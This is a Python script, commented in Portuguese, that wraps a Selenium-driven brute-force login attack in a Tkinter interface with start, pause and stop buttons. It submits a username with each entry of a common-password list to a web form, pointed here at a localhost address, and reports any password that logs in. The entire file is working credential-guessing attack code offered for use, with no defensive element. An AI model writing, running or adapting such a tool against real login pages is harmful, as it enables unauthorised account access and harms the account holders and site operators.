import tkinter as tk
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time
import threading

# URL do formulário de login
url = "http://127.0.0.1:5000/"

# Configuração do WebDriver
driver = webdriver.Chrome()

is_paused = False
is_stopped = False


def iniciar_ataque():
    global is_stopped, is_paused
    is_stopped = False
    is_paused = False
    threading.Thread(target=ataque_forca_bruta).start()


def pausar_ataque():
    global is_paused
    is_paused = not is_paused
    if is_paused:
        pause_button.config(text="Retomar Ataque")
    else:
        pause_button.config(text="Pausar Ataque")


def parar_ataque():
    global is_stopped
    is_stopped = True
    resultado.config(text="Ataque interrompido pelo usuário.")


def ataque_forca_bruta():
    global is_paused, is_stopped

    usuario = entrada_usuario.get()
    lista_senhas_input = entrada_senhas.get("1.0", tk.END)
    lista_senhas = lista_senhas_input.strip().split("\n")

    driver.get(url)

    for senha in lista_senhas:
        if is_stopped:
            break

        while is_paused:
            time.sleep(0.1)  # Aguarda um pouco antes de verificar novamente

        senha = senha.strip()

        # Localiza os elementos de entrada de usuário e senha na página
        usuario_input = driver.find_element(By.ID, "username")
        senha_input = driver.find_element(By.ID, "password")

        # Limpa os campos e insere o nome de usuário e senha atuais
        usuario_input.clear()
        senha_input.clear()
        usuario_input.send_keys(usuario)
        senha_input.send_keys(senha)

        # Submete o formulário
        senha_input.send_keys(Keys.RETURN)

        time.sleep(1)

        # Verifica se o login foi bem-sucedido
        if "Login bem-sucedido" in driver.page_source:
            resultado.config(text=f"Senha encontrada: {senha}")
            return
        else:
            resultado.config(text=f"Tentativa com senha '{senha}' falhou.")
            app_ataque.update()

    if not is_stopped:
        resultado.config(text="Senha não encontrada na lista.")


def on_close():
    driver.quit()
    app_ataque.destroy()


app_ataque = tk.Tk()
app_ataque.title("Ataque de Força Bruta")

tk.Label(app_ataque, text="Nome do usuário para o ataque:").pack()
entrada_usuario = tk.Entry(app_ataque)
entrada_usuario.pack()

tk.Label(app_ataque, text="Insira a lista de senhas (uma por linha):").pack()

entrada_senhas = tk.Text(app_ataque, width=50, height=10)
entrada_senhas.pack()

lista_senhas_inicial = [
    "123456", "password", "123456789", "senha123", "admin", "letmein"
]
entrada_senhas.insert(tk.END, "\n".join(lista_senhas_inicial))

tk.Button(app_ataque, text="Iniciar Ataque", command=iniciar_ataque).pack()

pause_button = tk.Button(
    app_ataque, text="Pausar Ataque", command=pausar_ataque)
pause_button.pack()

tk.Button(app_ataque, text="Parar Ataque", command=parar_ataque).pack()

resultado = tk.Label(app_ataque, text="")
resultado.pack()

app_ataque.protocol("WM_DELETE_WINDOW", on_close)

app_ataque.mainloop()
